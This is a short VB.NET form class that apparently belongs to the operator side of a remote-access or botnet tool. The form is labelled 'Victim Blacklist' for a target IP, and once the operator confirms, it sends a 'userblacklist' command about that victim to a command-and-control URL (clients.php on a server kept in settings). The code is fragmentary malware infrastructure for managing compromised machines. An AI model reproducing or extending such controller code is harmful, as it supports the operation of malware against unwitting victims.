Imports System.Net

Public Class Blacklist
    Dim vpsurl As String = My.Settings.vpsurl
    Public targetIp As String = ""
    Private Sub Blacklist_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Name = "Victim Blacklist @ " & targetIp
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.CheckState Then
            Button1.Enabled = False
            TextBox1.Enabled = True
            TextBox1.Text = ""
        Else
            TextBox1.Text = ""
            TextBox1.Enabled = False
            Button1.Enabled = True
        End If

    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
        Button1.Enabled = TextBox1.Text.Trim <> ""
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If MsgBox("Are you sure you want to blacklist this user ?" + Environment.NewLine + "THERE IS NO WAY BACK", MsgBoxStyle.YesNo) = MsgBoxResult.Yes Then
            MessageBox.Show("Succesfully blacklisted " & targetIp & ".")
            Dim client As New WebClient()
            client.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=userblacklist&actioncontent=" & TextBox1.Text)
            Me.Close()
        End If
    End Sub
End Class